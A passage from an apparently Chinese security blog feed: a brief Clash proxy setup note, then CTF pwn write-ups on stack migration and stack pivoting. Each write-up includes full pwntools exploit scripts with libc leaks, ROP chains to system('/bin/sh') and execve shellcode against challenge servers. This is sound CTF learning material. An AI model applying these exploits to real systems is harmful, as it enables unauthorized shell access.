src="/2020/02/14/linux下clash的使用/images/15816952499188.jpg" srcset="/img/loading.gif" alt="-w794"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>打开系统设置，选择网络，点击网络代理右边的 ⚙ 按钮，选择手动，填写 HTTP 和 HTTPS 代理为 127.0.0.1:7890，填写 Socks 主机为 127.0.0.1:7891，即可启用系统代理。<br><img src="file:///Volumes/data/chumenblog/source/images/15816953014396.jpg" srcset="/img/loading.gif" alt="-w409"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>终端开启代理<br><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7891</code><br>执行这个命令即可。<br><img src="file:///Volumes/data/chumenblog/source/images/15816954013538.jpg" srcset="/img/loading.gif" alt="-w495"><br>出现这个就是代理成功了，然后就会发现终端下载东西的神速。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;linux下clash的使用&quot;&gt;&lt;a href=&quot;#linux下clash的使用&quot; class=&quot;headerlink&quot; title=&quot;linux下clash的使用&quot;&gt;&lt;/a&gt;linux下clash的使用&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="linux" scheme="http://chumen77.xyz/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Stack Migration题目练习</title>
    <link href="http://chumen77.xyz/2020/02/11/Stack%20Migration%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2020/02/11/Stack Migration题目练习/</id>
    <published>2020-02-11T13:51:48.000Z</published>
    <updated>2020-02-28T07:51:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Stack-Migration题目练习"><a href="#Stack-Migration题目练习" class="headerlink" title="Stack Migration题目练习"></a>Stack Migration题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录几道Stack Migration的练习题。</p><h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><h3 id="查看保护和arch"><a href="#查看保护和arch" class="headerlink" title="查看保护和arch"></a>查看保护和arch</h3><pre><code class="c">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>32位程序，开了nx和Canary保护。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  int de_s; // [esp+18h] [ebp-28h]  char s; // [esp+1Eh] [ebp-22h]  unsigned int de_length; // [esp+3Ch] [ebp-4h]  memset(&amp;s, 0, 0x1Eu);  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  printf(&quot;Authenticate : &quot;);  _isoc99_scanf(&quot;%30s&quot;, &amp;s);  memset(&amp;input, 0, 0xCu);  de_s = 0;  de_length = Base64Decode((int)&amp;s, &amp;de_s);     // v6 = 解码后的长度  if ( de_length &gt; 0xC )  {    puts(&quot;Wrong Length&quot;);  }  else  {    memcpy(&amp;input, de_s, de_length);  // 执行完，把解码后的字段，放入input的bss内存上    if ( auth(de_length) == 1 )      correct();  }  return 0;}</code></pre><p>（其中已经改了部分变量的名称方便读代码）<br>流程就是接受一段base64编码过的字符串，然后进行一下解码，解码返回长度给变量，且做与12大小的比较，如果解码后大于12，就直接退出程序，并且解码的字符串是放在input的这个全局变量里：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814303737109.jpg" srcset="/img/loading.gif" alt="-w601"><br>接着进入auth函数分析一下：</p><pre><code class="c">_BOOL4 __cdecl auth(int length){  char v2; // [esp+14h] [ebp-14h]  char *s2; // [esp+1Ch] [ebp-Ch]  int v4; // [esp+20h] [ebp-8h]  memcpy(&amp;v4, &amp;input, length);  s2 = (char *)calc_md5((int)&amp;v2, 12);  printf(&quot;hash : %s\n&quot;, s2);  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;}</code></pre><p>可以发现其是一个md5加密后，然后跟后面那串字符串对比。并且看一下v4变量：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814310284289.jpg" srcset="/img/loading.gif" alt="-w407"><br>发现memcpy这个函数会引起栈溢出，但是可控的只是12-8 = 4字节。<img src="/2020/02/11/Stack Migration题目练习/images/15814313605840.jpg" srcset="/img/loading.gif" alt="-w1241"><br>然后输入12位‘1’，编码后放入程序，发现最后的4个字节被放入了ebp，正好这下就可以控制ebp了。接着就有了攻击思路：</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>控制好这个ebp，然后由于这个程序中，auth函数最后有一个leave ret 的gadget，main函数也有一个，正好满足我们来Stack Migration。在栈上摆放的结构为：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814316930734.jpg" srcset="/img/loading.gif" alt="-w353"><br>到时候由于memcpy会复制这个老栈的前12个字节的数据，然后new esp指向的是固定位置input。然后两个leave gadget即可</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>from pwn import *from base64 import *# io = process(&#39;./login&#39;)io = remote(&#39;node3.buuoj.cn&#39;,29026)system_add = 0x08049284buf = 0x0811EB40io.recvuntil(&#39;e : &#39;)p = &#39;aaaa&#39; + p32(system_add) + p32(buf)io.sendline(b64encode(p))io.interactive()</code></pre><h2 id="安恒月赛-over-over"><a href="#安恒月赛-over-over" class="headerlink" title="安恒月赛_over.over"></a>安恒月赛_over.over</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>64位，只开了nx</p><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3){  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  while ( sub_400676() )    ;  return 0LL;}</code></pre><p>主函数十分简单，主要核心就在while包裹的函数:</p><pre><code>int sub_400676(){  char buf; // [rsp+0h] [rbp-50h]  memset(&amp;buf, 0, 0x50uLL);  putchar(&#39;&gt;&#39;);  read(0, &amp;buf, 0x60uLL);  return puts(&amp;buf);}</code></pre><p>可以看到溢出可控自己只有8个字节，也就是一个gadget，明显需要Stack Migration，<br>那么就得控制好ebp，padding即为0x50，但是这个题目没有给我们固定的地址，也就是没有全局变量可用，那就想办法看栈偏移了。</p><p>可以看到是read函数，和puts函数的搭配，当往里面塞0x50字节字符是不会添加上’\x00’的:<br><img src="/2020/02/11/Stack Migration题目练习/images/15814741030442.jpg" srcset="/img/loading.gif" alt="-w781"><br><img src="/2020/02/11/Stack Migration题目练习/images/15814741289950.jpg" srcset="/img/loading.gif" alt="-w649"></p><p>然后用puts函数输出时会把ebp里面的值也会输出出来。这下栈偏移是固定的，就可以在read的时候往里面塞rop链，依靠偏移来跳上去执行就可以了。<br><img src="/2020/02/11/Stack Migration题目练习/images/15814770925207.jpg" srcset="/img/loading.gif" alt="-w842"><br>算一下main的ebp与现在的esp差距是112个字节。让ebp-112就等于esp指向了栈顶esp。</p><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>先给程序0x50个字节，然后接收下main的ebp值。然后程序由于while循环再次，进入这个函数，这时候送rop链，第一个rop链可以先泄露下puts的内存地址，然后计算libc的地址，返回地址写成主函数start，清理下栈。然后第二次读的时候，送过去system(/bin/sh)的rop链即可。程序每次读，构造好rop链的时候，要保证送过去80字节，然后控制ebp 为栈顶esp，还有加上leave 的gadget，这下两个leave的gadget就让程序跳回栈头的下个8个字节，开始执行rop链。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./over.over&#39;)e = ELF(&#39;./over.over&#39;)l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)leave_ret = 0x004006be pop_rdi_ret = 0x0400793put_got = e.got[&#39;puts&#39;]put_plt = e.symbols[&#39;puts&#39;]padding = 80raw_input(&#39;-&gt;&#39;)io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80)# stack = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#39;\0&#39;)) - 0x70stack = u64((io.recvline())[80:86].ljust(8,&#39;\x00&#39;)) - 0x70io.readuntil(&#39;&gt;&#39;)print(hex(stack))p = flat([&#39;11111111&#39;,pop_rdi_ret,put_got,put_plt,0x000400580,(80-40)*&#39;1&#39;,stack,leave_ret])raw_input(&#39;-&gt;&#39;)io.send(p)libc = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#39;\0&#39;)) - l.symbols[&#39;puts&#39;]print(hex(libc))io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80)stack = u64((io.recvline())[80:86].ljust(8,&#39;\x00&#39;)) - 0x70print(hex(stack))io.readuntil(&#39;&gt;&#39;)system_add = libc + l.symbols[&#39;system&#39;]binsh_add = libc + l.search(&#39;/bin/sh\x00&#39;).next()p = flat([&#39;22222222&#39;,pop_rdi_ret,binsh_add,system_add,(80-4*8)*&#39;2&#39;,stack,leave_ret])io.send(p)io.interactive()</code></pre><h2 id="HITCON-training-lab6"><a href="#HITCON-training-lab6" class="headerlink" title="HITCON_training_lab6"></a>HITCON_training_lab6</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code class="c">#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\xc3&quot; ;int main(){if( count!=1337 ){    _exit(1);}count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;}</code></pre><p><code>gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令。<br>然后就不分析了，前面练习64位时候写的那个博客已经记录很清楚了，这里只记录下exp。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;# io = process(&#39;./migration&#39;)io = remote(&#39;127.0.0.1&#39;,4000)e = ELF(&#39;./migration&#39;)l = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;)padding = 40puts_plt = e.symbols[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]read = e.symbols[&#39;read&#39;]leave_ret = 0x08048418buf1 = 0x0804b000 - 0x100buf2 = buf1 - 0x50pop_edx_ret = 0x0804836dp = &#39;a&#39; * padding + flat([buf1,read,leave_ret,0,buf1,0x50])io.readuntil(&#39;:\n&#39;)io.send(p)p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50])sleep(0.1)raw_input(&#39;-&gt;&#39;)io.sendline(p)puts_add = u32(io.recv(4))libc = puts_add - l.symbols[&#39;puts&#39;]print(hex(libc))system_add = l.symbols[&#39;system&#39;] + libcbinsh_add = l.search(&#39;/bin/sh\x00&#39;).next() + libcp = flat([buf1,system_add,system_add,binsh_add])raw_input(&#39;-&gt;&#39;)# sleep(0.1)io.sendline(p)io.interactive()</code></pre><h2 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code>  Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="尝试运行"><a href="#尝试运行" class="headerlink" title="尝试运行"></a>尝试运行</h3><p><img src="/2020/02/11/Stack Migration题目练习/images/15817739064330.jpg" srcset="/img/loading.gif" alt="-w602"></p><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>直接看漏洞函数</p><pre><code>ssize_t vul_function(){  size_t v0; // eax  size_t v1; // eax  char buf; // [esp+0h] [ebp-18h]  v0 = strlen(m1);  write(1, m1, v0);                             // Hello good Ctfer  read(0, &amp;s, 0x200u);  v1 = strlen(m2);  write(1, m2, v1);                             // What do you want to say?  return read(0, &amp;buf, 0x20u);}</code></pre><p>发现可以利用的gadget只有一个，那就只有leave的gadget了，然后把ebp控制到前面的read函数的s处，其也是全局变量，地址固定。<br><img src="/2020/02/11/Stack Migration题目练习/images/15817774030678.jpg" srcset="/img/loading.gif" alt="-w358"></p><h4 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>在第一个read的时候，直接把构造的rop链读进去。任务分别是leak 一个函数的内存地址，来用libcseacher算出system，跟/bin/sh字符串的地址，返回start函数清理栈开启第二次使用漏洞； call system（/bin/sh）</li><li>然后第二个read时候，把控ebp指向固定地址s的地址，retaddress 放上leave的gadget。</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;from LibcSearcher import *e = ELF(&#39;./spwn&#39;)io = process(&#39;./spwn&#39;)# libc = e.libcio = remote(&#39;node3.buuoj.cn&#39;,28527)padding = 24s = 0x0804A300fake1 = 0x0804A500leave_ret = 0x08048511puts_add = e.symbols[&#39;puts&#39;]write_plt = e.symbols[&#39;write&#39;]write_got = e.got[&#39;write&#39;]io.recvuntil(&#39;name?&#39;)p = flat([fake1,write_plt,0x080483A0,1,write_got,10])io.send(p)io.recvuntil(&#39;say?&#39;)p = padding * &#39;a&#39; + p32(s) + p32(leave_ret)# raw_input(&#39;-&gt;&#39;)io.send(p)write_add = u32(io.recv(4))print(hex(write_add))obj = LibcSearcher(&#39;write&#39;,write_add)libc_base = write_add - obj.dump(&#39;write&#39;) #libc.symbols[&#39;write&#39;]print(hex(obj.dump(&#39;write&#39;)))print(hex(libc_base))sys_add = libc_base + obj.dump(&#39;system&#39;) #libc.symbols[&#39;system&#39;]binsh_add =libc_base + obj.dump(&#39;str_bin_sh&#39;) #libc.search(&#39;/bin/sh\x00&#39;).next()io.recvuntil(&#39;name?&#39;)p = flat([fake1,sys_add,0x080483A0,binsh_add])io.send(p)io.recvuntil(&#39;say?&#39;)p = padding * &#39;a&#39; + p32(s) + p32(leave_ret)io.send(p)io.interactive()</code></pre><h2 id="ACTF-2019-hardcore-fmt"><a href="#ACTF-2019-hardcore-fmt" class="headerlink" title="ACTF_ 2019_hardcore fmt"></a>ACTF_ 2019_hardcore fmt</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>￼￼￼￼<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/oj5gX3.png" srcset="/img/loading.gif" alt><br>其中可以看到后面的read处，存在一个栈溢出，但是只有一个gadget可以用，需要考虑Stack Migration。其中那个<strong>sub400a1a</strong>函数是问你需要留下多少的字节，肯定要<code>0xe0</code>，所以再送过去的时候就填入0xe0，正好做参数给下面read函数用。</p><p>然后程序接受到0xe0后，进入if语句中，会输出一下堆栈esp的值，这下也是相当于知道了一个特定的地址，然后就正常构造rop链，把控ebp等于为接收到的stack esp，再跟上leava gadget即可。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;# io = process(&#39;./ACTF_2019_babystack&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,27626)io = remote(&#39;challenge-848a378609341016.sandbox.ctfhub.com&#39;, 24656)elf = ELF(&#39;./ACTF_2019_babystack&#39;)# libc = elf.libcio.recvuntil(&#39;message?\n&#39;)io.sendline(&#39;224&#39;)io.recvuntil(&#39;saved at&#39;)stack_addr =  int((io.recvline_contains(&#39;0x7f&#39;)),16)print(stack_addr)libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]pop_rdi_ret = 0x000400ad3start_addr = 0x000400800leave_ret = 0x400a18 payload = flat([&#39;\x00&#39;*8,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr])payload = payload.ljust(208,&#39;a&#39;)payload += flat([stack_addr,leave_ret])io.recvuntil(&#39;&gt;&#39;)raw_input(&#39;-&gt;&#39;)io.send(payload)io.recvuntil(&#39;bye~\n&#39;)libc_start_main_addr = u64(io.recv(6).ljust(8,&#39;\x00&#39;)) #- libc.symbols[&#39;__libc_start_main&#39;]obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)libc_base = libc_start_main_addr - obj.dump(&#39;__libc_start_main&#39;)print(hex(libc_base))io.recvuntil(&#39;message?\n&#39;)io.sendline(&#39;224&#39;)io.recvuntil(&#39;saved at&#39;)stack_addr =  int((io.recvline_contains(&#39;0x7f&#39;)),16)print(stack_addr)rec = libc_base + 0x4f2c5payload = flat([&#39;\x00&#39;*8,rec])payload = payload.ljust(208,&#39;\x00&#39;)payload += flat([stack_addr,leave_ret])io.recvuntil(&#39;&gt;&#39;)raw_input(&#39;-&gt;&#39;)io.send(payload)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Stack-Migration题目练习&quot;&gt;&lt;a href=&quot;#Stack-Migration题目练习&quot; class=&quot;headerlink&quot; title=&quot;Stack Migration题目练习&quot;&gt;&lt;/a&gt;Stack Migration题目练习&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="Stack Migration" scheme="http://chumen77.xyz/tags/Stack-Migration/"/>
    
  </entry>
  
  <entry>
    <title>花式栈溢出（栈帧的调节）</title>
    <link href="http://chumen77.xyz/2020/02/05/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88%E8%B0%83%E8%8A%82%E6%A0%88%E5%B8%A7%EF%BC%89/"/>
    <id>http://chumen77.xyz/2020/02/05/花式栈溢出（调节栈帧）/</id>
    <published>2020-02-05T08:53:11.000Z</published>
    <updated>2020-02-28T07:51:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="花式栈溢出（栈帧的调节）"><a href="#花式栈溢出（栈帧的调节）" class="headerlink" title="花式栈溢出（栈帧的调节）"></a>花式栈溢出（栈帧的调节）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人刚学pwn不久，最近在学习过程中学到了各种需要栈帧调节的题目，以此记录一下。<br>在一些栈溢出的程序中，我们会碰到一些问题，例如溢出的可控字节数太少，无法构造我们想要的rop链，程序ASLR开启后导致的栈地址不可预测等。对于这种问题，常用的思路包括：</p><ul><li>加减esp值，控制栈指针</li><li>Stack Migration来构造一个假的栈帧。</li></ul><p>这里总结了2种题型：</p><h2 id="加减esp，把控栈指针"><a href="#加减esp，把控栈指针" class="headerlink" title="加减esp，把控栈指针"></a>加减esp，把控栈指针</h2><p>这种题型就需要用Ropgadget找一个控制esp的gadget，然后简单修改esp值的大小，来满足我们的需求。</p><h3 id="Alictf-016-vss"><a href="#Alictf-016-vss" class="headerlink" title="Alictf_016_vss"></a>Alictf_016_vss</h3><p>这个题目就是一个修改esp扩大栈空间，从而构造rop链获取shell的题目。</p><h4 id="检查保护和arch"><a href="#检查保护和arch" class="headerlink" title="检查保护和arch"></a>检查保护和arch</h4><p><img src="http://q5j29gptn.bkt.clouddn.com/15808931260368.jpg" srcset="/img/loading.gif" alt="-w446"></p><h4 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h4><p>由于这个程序使用静态编译和strip命令剥离符号，用ida打开没有我们平时看的那么简单，<br>很多函数已经无法识别，我们就需要自己调试，然后推测是什么函数。<br><img src="http://q5j29gptn.bkt.clouddn.com/15808932166761.jpg" srcset="/img/loading.gif" alt="-w618"><br>start函数中，call的函数是__libc_start_main, 上一行的 offset则是main函数<br>那个箭头就是main函数了。进入main函数以后，<strong>可以经过syscall中rax的参数来确认其是什么函数</strong>，很明显一个函数是alarm函数，先手动nop一下。<br><img src="http://q5j29gptn.bkt.clouddn.com/15808934501240.jpg" srcset="/img/loading.gif" alt="-w555"><br>把这个函数去除后，方便gdb的后期调试。接着可以很容易确定一下puts函数跟read函数，在ida中修改一下。<img src="http://q5j29gptn.bkt.clouddn.com/15808936171885.jpg" srcset="/img/loading.gif" alt="-w528"><br>下面那个40108e函数是比较复杂的，我用edb动态调试来确定出其中的某些函数：<br><img src="http://q5j29gptn.bkt.clouddn.com/15808938970186.jpg" srcset="/img/loading.gif" alt="-w857"><br>对于这个函数，先确定一下其参数。<br><img src="http://q5j29gptn.bkt.clouddn.com/15808939630394.jpg" srcset="/img/loading.gif" alt="-w824"><br><img src="http://q5j29gptn.bkt.clouddn.com/15808939828470.jpg" srcset="/img/loading.gif" alt="-w322"><br>dump过去就会发现是复制了一份。所以就确定这个函数是<code>strncpy</code>是函数。<br>对于这个函数<code>char *strncpy(char *dest, const char *src, int n)</code><strong>将src指向的字符数组中n个字符复制到dest指向的字符数组中，在第一个空字符处停止，并返回被复制后的dest</strong>。<br><img src="http://q5j29gptn.bkt.clouddn.com/15808946102427.jpg" srcset="/img/loading.gif" alt="-w781"><br>对于下一段就是判断一下，是否与0x79和0x70相等，可以来手动修改值让其相等。<br><img src="http://q5j29gptn.bkt.clouddn.com/15808947377600.jpg" srcset="/img/loading.gif" alt="-w803"><br>往后走会发现先溢出了，在做溢出题的时候看到return 就应该想办法想上跳。<br><img src="http://q5j29gptn.bkt.clouddn.com/15808948243514.jpg" srcset="/img/loading.gif" alt="-w368"><br>溢出的这个地址就是刚刚又syrcpy函数复制过来0x50字节中的最后8个字节，因为是strncpy函数，<strong>我们输入的字符串中是不能有\x00</strong>，否则会被截断，从而无法复制满0x50字节制造可控溢出，所以前0x48个字节中，我们不能写入任何地址。在这种情况下就需要通过修改esp来完成漏洞利用。</p><p>在最前面的read函数中，给了十分大的缓冲区可以用，我们可以把ROP链放在0x50字节之后，然后通过增加esp的值把栈顶抬到ROP链上，紧接着执行这个rop链即可。</p><p>查到one_gadget发现<code>0x000000000046f205 : add rsp, 0x58 ; ret</code>正好符合要求。然后gdb调试一下确定一下rop链从50个字节后的那里开始合适即可。<strong>（这个在找onegadget的时候注意不要把rsp搞成esp了，自己在做的时候因为这个调试了半天，才发现是这个错误，导致exp不成功）</strong></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code>from pwn import *import timeio = process(&#39;./vss&#39;)e = ELF(&#39;./vss&#39;)io.recvuntil(&#39;Password:\n&#39;)add_rsp_0x58_ret = 0x0046f205pop_rax_ret = 0x0046f208pop_rdi_ret = 0x0401823pop_rsi_ret = 0x0401937pop_rdx_ret = 0x043ae05bss = 0x6C8178 -10syscall_ret = 0x0045f2a5rop1 = [    pop_rax_ret,    0,    pop_rdi_ret,    0,    pop_rsi_ret,    bss,    pop_rdx_ret,    10,    syscall_ret,    pop_rax_ret,    0x3b,    pop_rdi_ret,    bss,    pop_rsi_ret,    0,    pop_rdx_ret,    0,    syscall_ret]# raw_input(&#39;-&gt;&#39;)io.sendline(&#39;py&#39; + &#39;a&#39;*70 + p64(add_rsp_0x58_ret)+ &#39;b&#39;* 8 + &#39;&#39;.join(map(p64,rop1)))# raw_input(&#39;-&gt;&#39;)sleep(0.1)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016-b0verfl0w"></a>X-CTF Quals 2016-b0verfl0w</h3><h4 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="http://q5j29gptn.bkt.clouddn.com/15811429422510.jpg" srcset="/img/loading.gif" alt="-w438"><br>这个nx也没有开，可以用栈执行shellcode</p><h4 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h4><pre><code>signed int vul(){  char s; // [esp+18h] [ebp-20h]  puts(&quot;\n======================&quot;);  puts(&quot;\nWelcome to X-CTF 2016!&quot;);  puts(&quot;\n======================&quot;);  puts(&quot;What&#39;s your name?&quot;);  fflush(stdout);  fgets(&amp;s, 50, stdin);  printf(&quot;Hello %s.&quot;, &amp;s);  fflush(stdout);  return 1;}</code></pre><p>代码很简单，但是可以发现可以溢出的字节只有50-0x20-4=14个字节可控，所以是很难写出rop链来获取咱们目的的。然后就可以考虑控制栈指针的攻击思路，就是先把shellcode摆在栈上，然后控制eip到达这里就可以了。但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。</p><p>找一下控制esp的gadget<br>    0x08048504 : jmp esp<br>然后怎么控制eip到shellcode上呢，因为没有nx保护，我们可以写一段指令来控制偏移：</p><pre><code>sub esp,0x28jmp esp</code></pre><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code>from pwn import *#io = process(&#39;./b0verfl0w&#39;)context.arch = &#39;i386&#39;io = remote(&#39;node3.buuoj.cn&#39;,29410)shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode += &quot;\x0b\xcd\x80&quot;sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)jmp_esp = 0x08048504payload = shellcode + (36-len(shellcode_x86))*&#39;b&#39;+p32(jmp_esp) + sub_esp_jmpio.readuntil(&#39;?\n&#39;)#raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><p>在 Stack Migration 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们知道在函数建立栈帧时有两条指令<code>push ebp; mov ebp, esp</code>，而退出时同样需要消除这两条指令的影响，即<code>leave(mov esp, ebp; pop ebp)</code> 。且leave一般紧跟着就是ret。<strong>因此，在存在栈溢出的程序中，只要我们能控制到栈中的ebp，我们就可以通过两次leave劫持栈。</strong></p><p><img src="http://q5j29gptn.bkt.clouddn.com/15813373484321.jpg" srcset="/img/loading.gif" alt="-w533"><br>第一次随着程序流<code>leave; ret</code>，new esp为我们构造新栈的目标地址。 可以看到执行到ret时，esp还在原来的old栈上，而ebp已经指向了新的栈的栈顶。<br><img src="https://s2.ax1x.com/2020/02/11/1ovtYT.jpg" srcset="/img/loading.gif" alt="1ovtYT.jpg"><br>第二次进入我们放入栈上的<code>leave; ret</code> 的gadget（<strong>这个是我们事先写上栈的</strong>）esp已经被成功劫持到新的栈上，执行完gadget后栈顶会 在new_esp-4(64位是-8)的位置上。此时栈完全可控了，通过预先或者之后在new stack上布置的rop链可以轻松完成攻击。<br><img src="https://s2.ax1x.com/2020/02/11/1oxKN6.png" srcset="/img/loading.gif" alt="1oxKN6.png"><br><img src="https://s2.ax1x.com/2020/02/11/1ovjXj.png" srcset="/img/loading.gif" alt="1ovjXj.png"></p><h3 id="HITCON-training-lab6-64位"><a href="#HITCON-training-lab6-64位" class="headerlink" title="HITCON_training_lab6_64位"></a>HITCON_training_lab6_64位</h3><p>这个是在HITCON_training的一个练习，直接给的有源码，我给编译成了64位版本。</p><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><pre><code>#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\xc3&quot; ;int main(){if( count!=1337 ){    _exit(1);}count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;}</code></pre><p><code>gcc  -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令</p><h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><p>这个题纯粹就是为了练习的Stack Migration用的，可以不分析代码直接用gdb-peda直接来测试：<br><img src="http://q5j29gptn.bkt.clouddn.com/15813398610900.jpg" srcset="/img/loading.gif" alt="-w332"><br><img src="http://q5j29gptn.bkt.clouddn.com/15813398926858.jpg" srcset="/img/loading.gif" alt="-w955"><br>熟悉的栈溢出，但是下面多出来的一些字符串，也是程序不能接受的部分，也可以作为一个需要考虑栈迁移的标志。<br><img src="https://s2.ax1x.com/2020/02/11/1og2r9.jpg" srcset="/img/loading.gif" alt="1og2r9.jpg"><br>注意一下rsp被覆盖的值。<br><img src="https://s2.ax1x.com/2020/02/11/1ogs8U.jpg" srcset="/img/loading.gif" alt="1ogs8U.jpg"><br>计算padding为48.<br><img 